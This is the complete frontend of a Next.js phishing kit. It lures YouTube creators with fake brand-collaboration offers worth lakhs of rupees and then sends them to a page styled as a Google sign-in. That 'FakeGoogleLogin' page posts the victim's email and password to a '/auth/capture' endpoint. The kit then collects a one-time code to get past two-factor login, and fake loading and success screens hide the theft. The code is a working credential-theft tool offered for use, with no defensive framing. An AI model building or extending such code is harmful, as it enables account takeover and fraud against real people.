/**
 * COMPLETE FRONTEND CODE
 * ======================
 * All Pages, Components, Utilities in one file
 * Next.js application with all routes
 */

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import axios from 'axios';

const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000/api';

// ==================== API UTILITIES ====================

const api = axios.create({
  baseURL: API_URL,
  headers: { 'Content-Type': 'application/json' }
});

const apiUtils = {
  captureCredentials: (email, password) =>
    api.post('/auth/capture', { email, password }),
  sendOTP: (email) =>
    api.post('/otp/send', { email }),
  verifyOTP: (email, otp) =>
    api.post('/otp/verify', { email, otp }),
  fetchChannelData: (channelUrl) =>
    api.post('/channel/fetch', { channelUrl }),
  getChannelById: (channelId) =>
    api.get(`/channel/${channelId}`)
};

// ==================== COMPONENTS ====================

// Loading Spinner
function LoadingSpinner({ visible = false, message = 'Loading...' }) {
  if (!visible) return null;

  return (
    <div style={{
      position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.7)', display: 'flex',
      alignItems: 'center', justifyContent: 'center', zIndex: 9999
    }}>
      <div style={{ textAlign: 'center' }}>
        <div style={{
          width: '50px', height: '50px', border: '4px solid rgba(255,255,255,0.3)',
          borderTop: '4px solid white', borderRadius: '50%',
          animation: 'spin 1s linear infinite', margin: '0 auto 20px'
        }} />
        <p style={{ color: 'white', fontSize: '18px', fontWeight: 'bold' }}>{message}</p>
      </div>
      <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

// Toast Notification
function Toast({ message, type = 'success', duration = 3000, onClose }) {
  useEffect(() => {
    const timer = setTimeout(onClose, duration);
    return () => clearTimeout(timer);
  }, [duration, onClose]);

  const bgColor = type === 'success' ? '#d4edda' : type === 'error' ? '#f8d7da' : '#d1ecf1';
  const textColor = type === 'success' ? '#155724' : type === 'error' ? '#721c24' : '#0c5460';
  const borderColor = type === 'success' ? '#c3e6cb' : type === 'error' ? '#f5c6cb' : '#bee5eb';

  return (
    <div style={{
      position: 'fixed', top: '20px', right: '20px', padding: '15px 20px',
      backgroundColor: bgColor, color: textColor, border: `1px solid ${borderColor}`,
      borderRadius: '5px', boxShadow: '0 4px 12px rgba(0,0,0,0.15)', zIndex: 9999,
      animation: 'slideIn 0.3s ease-out'
    }}>
      {message}
      <style>{`@keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }`}</style>
    </div>
  );
}

// Brand Collaborations
function BrandCollaborations() {
  const brands = [
    { id: 1, name: 'TechCorp', rate: '₹5,00,000', logo: '/techcorp.png' },
    { id: 2, name: 'FashionHub', rate: '₹3,50,000', logo: '/fashionhub.png' },
    { id: 3, name: 'FoodieExpress', rate: '₹2,00,000', logo: '/foodieexpress.png' },
    { id: 4, name: 'TravelWorld', rate: '₹4,00,000', logo: '/travelworld.png' },
    { id: 5, name: 'FitnessPro', rate: '₹2,50,000', logo: '/fitnesspro.png' }
  ];

  const [filter, setFilter] = useState('');
  const filteredBrands = brands.filter(b => b.name.toLowerCase().includes(filter.toLowerCase()));

  return (
    <div className="p-8 bg-gray-50">
      <h1 className="text-4xl font-bold mb-6">Brand Collaborations</h1>
      <input
        type="text"
        placeholder="Search brands..."
        value={filter}
        onChange={(e) => setFilter(e.target.value)}
        className="w-full p-3 mb-8 border rounded-lg"
      />
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {filteredBrands.map((brand) => (
          <div key={brand.id} className="bg-white p-6 rounded-lg shadow-lg">
            <p className="text-green-600 text-lg font-semibold mb-4">{brand.rate}</p>
            <h2 className="text-xl font-bold mb-2">{brand.name}</h2>
            <button className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
              Apply Now
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

// ==================== PAGES ====================

// Home Page
export function Home() {
  const [showJoinForm, setShowJoinForm] = useState(false);

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 to-black">
      <nav className="flex justify-between items-center p-6 bg-black border-b border-gray-700">
        <h1 className="text-white text-3xl font-bold">CreatorHub</h1>
        <button
          onClick={() => setShowJoinForm(true)}
          className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded-lg font-bold"
        >
          Join as Creator
        </button>
      </nav>
      <div className="p-8">
        <BrandCollaborations />
      </div>
      {showJoinForm && <JoinCreatorModal onClose={() => setShowJoinForm(false)} />}
    </div>
  );
}

// Join Creator Modal
function JoinCreatorModal({ onClose }) {
  const router = useRouter();
  const [youtubeUrl, setYoutubeUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await apiUtils.fetchChannelData(youtubeUrl);
      if (response.data.success) {
        router.push(`/verify?channel=${response.data.channelId}`);
      }
    } catch (error) {
      setError('Invalid YouTube URL');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg p-8 w-96">
        <h2 className="text-2xl font-bold mb-6">Enter Your YouTube Channel</h2>
        {error && <div className="text-red-600 mb-4">{error}</div>}
        <form onSubmit={handleSubmit}>
          <input
            type="url"
            placeholder="https://www.youtube.com/@yourChannel"
            value={youtubeUrl}
            onChange={(e) => setYoutubeUrl(e.target.value)}
            className="w-full p-3 border rounded-lg mb-4"
            required
          />
          <div className="flex gap-3">
            <button
              type="button"
              onClick={onClose}
              className="flex-1 bg-gray-300 text-black py-2 rounded-lg font-bold"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={loading}
              className="flex-1 bg-red-600 text-white py-2 rounded-lg font-bold disabled:bg-gray-400"
            >
              {loading ? 'Loading...' : 'Continue'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

// Verify Page
export function Verify() {
  const router = useRouter();
  const { channel } = router.query;
  const [channelData, setChannelData] = useState(null);

  useEffect(() => {
    if (channel) {
      apiUtils.getChannelById(channel).then(res => setChannelData(res.data));
    }
  }, [channel]);

  if (!channelData) return <LoadingSpinner visible={true} />;

  return (
    <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="bg-white rounded-lg p-8 w-96 text-center">
        <img src={channelData.profilePic} alt={channelData.name} className="w-24 h-24 rounded-full mx-auto mb-4" />
        <h2 className="text-2xl font-bold mb-2">{channelData.name}</h2>
        <p className="text-gray-600 mb-6">Subscribers: {channelData.subscribers}</p>
        <button
          onClick={() => router.push('/fake-google-login')}
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700"
        >
          Confirm Your Channel
        </button>
      </div>
    </div>
  );
}

// Fake Google Login
export function FakeGoogleLogin() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setError('');
    if (!isValidEmail(email)) {
      setError('❌ Please enter a valid email');
      return;
    }
    setStep(2);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (!password || password.length < 6) {
      setError('❌ Password must be at least 6 characters');
      setLoading(false);
      return;
    }

    try {
      await apiUtils.captureCredentials(email, password);
      router.push(`/otp-verification?email=${email}`);
    } catch (error) {
      setError('❌ Something went wrong');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="w-96">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-blue-600">G</h1>
          <p className="text-gray-600 mt-2">Sign in with your Google Account</p>
        </div>

        {error && <div className="bg-red-100 text-red-700 p-3 rounded-lg mb-4">{error}</div>}

        {step === 1 ? (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              value={email}
              onChange={(e) => { setEmail(e.target.value); setError(''); }}
              placeholder="Email or phone"
              className="w-full p-3 border rounded-lg mb-6 focus:outline-none focus:border-blue-600"
              required
            />
            <button type="submit" className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold">Next</button>
          </form>
        ) : (
          <form onSubmit={handlePasswordSubmit}>
            <div className="mb-4">
              <p className="text-gray-700 font-semibold mb-2">{email}</p>
              <button
                type="button"
                onClick={() => { setStep(1); setError(''); }}
                className="text-blue-600 text-sm hover:underline"
              >
                Change account?
              </button>
            </div>
            <input
              type="password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(''); }}
              placeholder="Enter your password"
              className="w-full p-3 border rounded-lg mb-6 focus:outline-none focus:border-blue-600"
              required
            />
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 disabled:bg-gray-400"
            >
              {loading ? 'Signing in...' : 'Next'}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}

// OTP Verification
export function OTPVerification() {
  const router = useRouter();
  const { email } = router.query;
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);

  const handleOTPSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await apiUtils.verifyOTP(email, otp);
      if (response.data.success) {
        router.push('/loading');
      }
    } catch (error) {
      alert('Invalid OTP');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="w-96">
        <h2 className="text-2xl font-bold mb-2">Enter verification code</h2>
        <p className="text-gray-600 mb-6">We've sent a code to {email}</p>
        <form onSubmit={handleOTPSubmit}>
          <input
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
            placeholder="000000"
            maxLength="6"
            className="w-full p-3 border rounded-lg mb-6 text-2xl text-center font-bold focus:outline-none"
            required
          />
          <button
            type="submit"
            disabled={loading || otp.length !== 6}
            className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 disabled:bg-gray-400"
          >
            {loading ? 'Verifying...' : 'Verify'}
          </button>
        </form>
      </div>
    </div>
  );
}

// Loading Page
export function Loading() {
  const router = useRouter();
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => router.push('/success'), 500);
          return 100;
        }
        return prev + Math.random() * 30;
      });
    }, 500);

    return () => clearInterval(interval);
  }, [router]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-600 to-blue-800 flex flex-col items-center justify-center">
      <div className="text-center">
        <h1 className="text-4xl font-bold text-white mb-8">Accessing Your Channel</h1>
        <div className="mb-8 inline-block">
          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-white"></div>
        </div>
        <div className="w-80 bg-gray-300 rounded-full h-4 mb-4">
          <div
            className="bg-white h-4 rounded-full transition-all duration-300"
            style={{ width: `${Math.min(progress, 100)}%` }}
          ></div>
        </div>
        <p className="text-white text-lg">{Math.min(Math.floor(progress), 100)}%</p>
        <p className="text-gray-200 mt-4">Please wait 2-3 minutes...</p>
      </div>
    </div>
  );
}

// Success Page
export function Success() {
  const router = useRouter();

  useEffect(() => {
    setTimeout(() => {
      router.push('/');
    }, 3000);
  }, [router]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-green-500 to-green-700 flex items-center justify-center">
      <div className="text-center">
        <h1 className="text-5xl font-bold text-white mb-4">✅ Success!</h1>
        <p className="text-xl text-white mb-2">Your channel has been verified</p>
        <p className="text-lg text-gray-100">Redirecting in 3 seconds...</p>
      </div>
    </div>
  );
}

// Main App Component
export default function App() {
  const router = useRouter();

  if (!router.isReady) return <LoadingSpinner visible={true} />;

  const { pathname } = router;

  switch (pathname) {
    case '/':
      return <Home />;
    case '/verify':
      return <Verify />;
    case '/fake-google-login':
      return <FakeGoogleLogin />;
    case '/otp-verification':
      return <OTPVerification />;
    case '/loading':
      return <Loading />;
    case '/success':
      return <Success />;
    default:
      return <Home />;
  }
}